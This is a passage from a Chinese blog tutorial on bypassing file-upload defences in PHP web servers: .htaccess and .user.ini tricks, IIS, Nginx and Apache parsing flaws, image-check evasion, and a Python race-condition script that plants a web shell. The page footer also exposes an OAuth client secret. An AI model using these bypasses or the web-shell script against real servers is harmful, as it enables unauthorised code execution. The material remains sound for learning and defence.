+<li>首先上传 <code>a.php:.jpg</code> 文件，这实际上是创建了一个文件名为 <code>a.php</code>、数据流名为 <code>.jpg</code> 的文件。此文件上传后，实际生成的是一个空的 <code>a.php</code> 主数据流文件（没有内容），且不会触发文件后缀检测（因为它不含 PHP 代码）</li>
+<li>然后可以再上传 <code>a.ph&lt;</code> 文件，利用某些漏洞上传带 <code>&lt;</code> 字符的文件。因为某些系统会自动将 <code>a.ph&lt;</code> 解析为 <code>a.php</code>，在文件内容写入后，<code>a.php</code> 实际上就拥有了有效的 PHP 代码内容，从而实现代码注入。</li>
+</ul>
+</li>
+</ul>
+<p>【上传文件不重命名】</p>
+<ol>
+<li><p>上传 <code>.htaccess</code> 文件绕过黑名单</p>
+<p> <code>.htaccess</code> 是Apache分布式配置文件的默认名称，通常用于目录级别的访问控制和配置修改。利用 .htaccess 文件，可以更改文件的处理方式，进而绕过上传文件的黑名单限制。</p>
+<p> 下面举个例子：上传一个 .htaccess 文件并添加配置，比如：</p>
+ <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 .jpg 文件当作 PHP 执行</span></span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .jpg  </span><br></pre></td></tr></table></figure>
+
+<p> 这样，当攻击者上传一个带有 .jpg 后缀的文件且内容包含 PHP 代码时，服务器会将其作为 PHP 文件解析执行，绕过文件后缀黑名单。</p>
+</li>
+<li><p>上传 <code>.user.ini</code> 文件绕过黑名单</p>
+<p> <code>.user.ini</code> 文件是一种分布式配置文件，主要用于 PHP 的运行配置，通常在基于 PHP 的 Web 服务器（例如 Nginx、Apache）上有效。它的作用类似于 <code>.htaccess</code>文件，但专门用于修改 PHP 环境配置。</p>
+<p> 下面举个例子，攻击者上传一个 <code>.user.ini</code> 文件，设置一些配置来影响 PHP 文件的执行，例如：</p>
+ <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 auto_prepend_file 设置为特定文件（如包含恶意代码的文件）</span></span><br><span class="line"><span class="attr">auto_prepend_file</span> = <span class="string">&quot;malicious.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p> 这样，每次访问此目录时，PHP 都会在运行其他代码之前先执行<code> malicious.php</code>，实现代码注入。</p>
+<p> 另一种利用方式是通过 <code>user_ini.filename</code> 设置，将任意文件类型（如 .jpg）解析为 PHP 脚本。假设服务器管理员在 php.ini 中配置了以下内容，将 .jpg 文件解析为 PHP 脚本：</p>
+ <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在 php.ini 中添加以下配置</span></span><br><span class="line"><span class="attr">user_ini.filename</span> = <span class="string">&quot;settings.jpg&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p> 以上配置告诉 PHP 将任何名为 settings.jpg 的文件识别为 .user.ini 配置文件。</p>
+</li>
+</ol>
+<h3 id="4-4-文件后缀白名单绕过"><a href="#4-4-文件后缀白名单绕过" class="headerlink" title="4.4 文件后缀白名单绕过"></a>4.4 文件后缀白名单绕过</h3><p>白名单校验文件后缀比黑名单校验更加安全、普遍，绕过白名单通常需要借助Web服务器的各解析漏洞或ImageMagick等组件漏洞。</p>
+<p>【IIS解析漏洞】</p>
+<p>IIS6中存在两个解析漏洞：</p>
+<ol>
+<li><code>*.asp</code> 文件夹下的所有文件会被当作脚本文件进行解析</li>
+<li>文件名为 <code>yu.asp;a.jpg</code> 的文件会被解析为ASP文件，上传 <code>x.asp;a.jpg</code> 文件获取到的后缀为jpg，能够通过白名单校验</li>
+</ol>
+<p>【Nginx解析漏洞】</p>
+<p>Nginx解析漏洞是配置不当造成的。在Nginx未配置 <code>try_files</code> 且FPM未设置 <code>security.limit_extensions</code> 的场景下，可能出现解析漏洞。</p>
+<p>【Apache多后缀文件解析漏洞】</p>
+<p>在Apache中，单个文件支持有多个后缀，多后缀文件会从最右后缀开始识别。<code>x.php.xxx</code>，因为 <code>xxx</code> 后缀不存在对应的handler，就会继续识别出后缀为 <code>php</code>。</p>
+<h3 id="4-5-文件禁止访问绕过"><a href="#4-5-文件禁止访问绕过" class="headerlink" title="4.5 文件禁止访问绕过"></a>4.5 文件禁止访问绕过</h3><p>我们在4.1节曾提起用户随意上传的文件不建议放在已知目录中，假设现在上传目录下的脚本文件是禁止访问。</p>
+<p>最好的绕过方法是目录穿越上传到根目录，比如尝试 <code>../x.php</code> 等类似文件，但这种方式对于 <code>$_FILES</code> 上传是不能实现的，因为该方法内部调用 _basename() 方法处理了文件名。</p>
+<p>【文件上传到OSS】</p>
+<p>随着云对象存储的发展，越来越多的网站选择将文件上传到OSS中，虽然上传到OSS中的文件不会被服务端解析（因此有很多凯发展允许用户在OSS上传任意文件），但是OSS一般都会提供域名绑定，如果网站把OSS绑定到自己的二级域名下，这时候就可以通过上传HTML、SVG等文件让浏览器解析来实现XSS。</p>
+<p>可以造成弹窗或页面篡改、窃取敏感信息、会话劫持等影响。</p>
+<p>【配合文件包含绕过】</p>
+<p>详见 <a target="_blank" rel="noopener" href="http://www.yulegeyu.com/2019/02/15/Some-vulnerabilities-in-JEECMSV9/">http://www.yulegeyu.com/2019/02/15/Some-vulnerabilities-in-JEECMSV9/</a></p>
+<p>【一些可能被绕过的Web配置】</p>
+<p>上传目录中禁止文件执行通常在Web服务器中配置，在不当配置下可能存在绕过。</p>
+<ol>
+<li><p>pathinfo 导致的绕过问题</p>
+ <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁止在 /upload/ 目录中访问扩展名为 .php、.php5、.phtml 和 .pht 的文件。</span></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ /upload/.*\.(php|php5|phtml|pht)$</span> &#123;  </span><br><span class="line">  <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php(/|$)</span> &#123; <span class="comment"># 匹配以 .php 结尾的请求路径，或包含 .php/ 后续路径的请求。即匹配所有 PHP 文件请求</span></span><br><span class="line">  <span class="comment">#try_files $uri=404</span></span><br><span class="line">  <span class="attribute">fastcgi_pass</span> <span class="comment"># Nginx 将请求转发给 PHP-FPM 处理</span></span><br><span class="line">    unix:/Applications/MAMP/Library/fastcgi/nginxFastCGI_php5.4.45.sock;</span><br><span class="line">  <span class="attribute">fastcgi_param</span> <span class="comment"># 设置 SCRIPT_FILENAME 参数，将请求的 PHP 文件路径传递给 PHP-FPM</span></span><br><span class="line">    SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">  <span class="attribute">include</span> /Application/MAMP/conf/nginx/fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 对于 <code>x.php/xxx</code> 并不符合deny all的匹配规则，导致绕过。</p>
+</li>
+<li><p>Location 匹配顺序导致的绕过问题</p>
+<p> Nginx配置经常会出现多个location都能匹配请求URI的场景，匹配优先级规则是：</p>
+<ul>
+<li>先匹配普通location，再匹配正则location。如果存在多个location都匹配URI，则会按照最长前缀原则选择location。</li>
+<li>在普通location匹配完成后，如果不是完全匹配则不会结束，继续交给正则location检测，如果正则匹配成功，则会覆盖普通location匹配的结果。</li>
+<li>正则匹配的物理顺序为在配置文件的先后顺序，正则匹配成功后匹配结束。</li>
+</ul>
+</li>
+</ol>
+<p>​        参考上一个例子的配置，deny all 被正则location匹配所覆盖。正确的配置方法应该在普通匹配前加上 <code>^~</code>，表示只要该普通匹配成功，就算不是完全匹配也不再进行正则匹配。</p>
+<p>【利用Apache解析漏洞绕过】</p>
+<p>Apache通常使用下述配置禁止上传目录的脚本文件被访问</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory <span class="string">&quot;/Applications/MAMP/htdocs/book/upload&quot;</span>&gt;</span></span><br><span class="line">	<span class="section">&lt;FilesMatch <span class="string">&quot;.(php|php5|phtml)$&quot;</span>&gt;</span></span><br><span class="line">		<span class="attribute"><span class="nomarkup">Deny</span></span> from <span class="literal">all</span></span><br><span class="line">	<span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候我们可以利用Apache的解析漏洞上传yu.php.aaa文件，使其不符合deny all的匹配规则实现绕过</p>
+<h3 id="4-6-绕过图片验证实现代码执行"><a href="#4-6-绕过图片验证实现代码执行" class="headerlink" title="4.6 绕过图片验证实现代码执行"></a>4.6 绕过图片验证实现代码执行</h3><p>部分开发者认为，如果上传的图片是一张正常的图片就不可能再执行代码，所以允许任意后缀文件上传。但是在PHP中，检测文件是否是正常图片的方法往往可以被绕过。</p>
+<p>【getimagesize绕过】</p>
+<p>说明：getimagesize函数用于测定任何图像文件的大小并返回图像的尺寸以及文件类型，如果文件不是有效图片，则返回false和错误。</p>
+<p>绕过：getimagesize的绕过比较简单，只需要将PHP代码添加到图片内容后（文本打开图片后追加）。</p>
+<p>【imagecreatefromjpeg绕过】</p>
+<p>说明：该方法会渲染图像生成新的图像，在图像中注入脚本代码经过渲染后，脚本代码会消失，即不能使用上一个方法。</p>
+<p>绕过：先上传正常图片文件再下载回渲染后的图片，运行<code>jpg_playload.php</code> （可以去搜一下代码）文件处理下载回来的图片，将代码注入图片文件。再上传生成新的图片，则能使得脚本代码存在。</p>
+<h3 id="4-7-上传生成的临时文件利用"><a href="#4-7-上传生成的临时文件利用" class="headerlink" title="4.7 上传生成的临时文件利用"></a>4.7 上传生成的临时文件利用</h3><p>PHP在上传文件的过程中会生成临时文件，在上传完成后会删除临时文件。可以利用一些工具来找到临时文件的文件名。</p>
+<ol>
+<li>LFI via phpinfo</li>
+<li>LFI via Upload_Progress</li>
+<li>LFI via Segmentation fault</li>
+</ol>
+<h3 id="4-8-ZIP-上传带来的问题"><a href="#4-8-ZIP-上传带来的问题" class="headerlink" title="4.8 ZIP 上传带来的问题"></a>4.8 ZIP 上传带来的问题</h3><p>为了实现批量上传，很多系统支持ZIP压缩包，再在后段解压ZIP文件，如果没有对解压出来的文件做好处理，就会导致安全问题。</p>
+<ol>
+<li><p>未处理解压文件</p>
+<p> 例如仅在上传时限制文件后缀必须为zip，但是没有对解压的文件做任何处理。因此可以把PHP文件压缩为zip文件。</p>
+</li>
+<li><p>未递归检测上传目录（检测是否存在脚本文件）导致绕过</p>
+</li>
+<li><p>条件竞争导致绕过</p>
+<p> 原理：不合法文件会被服务端检测程序删除，因此频繁上传恶意文件，利用服务端删除可能存在时延的偶然情况，在文件被删除前访问文件，就可以执行脚本文件的内容。</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传恶意文件并访问其 URL</span></span><br><span class="line">upload_url = <span class="string">&quot;http://target-site.com/upload&quot;</span></span><br><span class="line">malicious_file_url = <span class="string">&quot;http://target-site.com/uploads/malicious.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传恶意文件</span></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;malicious.php&quot;</span>, <span class="string">&quot;&lt;?php file_put_contents(&#x27;/var/www/html/backdoor.php&#x27;, &#x27;&lt;?php system($_GET[cmd]); ?&gt;&#x27;); ?&gt;&quot;</span>)&#125;</span><br><span class="line">requests.post(upload_url, files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程频繁访问恶意文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">access_file</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        requests.get(malicious_file_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建线程并启动（提高并发，增加偶然事件成功率）</span></span><br><span class="line">threads = [threading.Thread(target=access_file) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>xyy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.xuyuyan.cn/2024/11/08/Web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/">http://www.xuyuyan.cn/2024/11/08/Web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/</a></span>
+                    </p>
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/SSRF/"># SSRF</a>
+                    
+                        <a href="/tags/%E5%8F%8D%E5%90%91Shell/"># 反向Shell</a>
+                    
+                        <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%89%A7%E8%A1%8C/"># 命令行执行</a>
+                    
+                        <a href="/tags/XSS/"># XSS</a>
+                    
+                        <a href="/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"># web文件上传</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/11/01/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: '4283629b368b1cf98f81',
+        clientSecret: '8bb6ce27010c0db8286e943f3765aeae1757de4d',
+        repo: 'xyyBlog',
+        owner: 'rdzfv',
+        admin: 'rdzfv',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 10,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: true
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+
+
+        </div>
+        <footer id="footer" class="footer">
+   <div class="copyright">
+    <div style="position:fixed;left:8%;bottom:5%;">
+        <div id="webpushr-subscription-button" data-button-text="订阅本站" data-subscriber-count-text="人已订阅" data-background-color="#000000"></div>
+    </div>
+    <div style="display:inline-block;">
+        <div> <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/" style="text-decoration: none;color: black;" >浙ICP备19012712号</a> </div>
+        <span>© xyy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
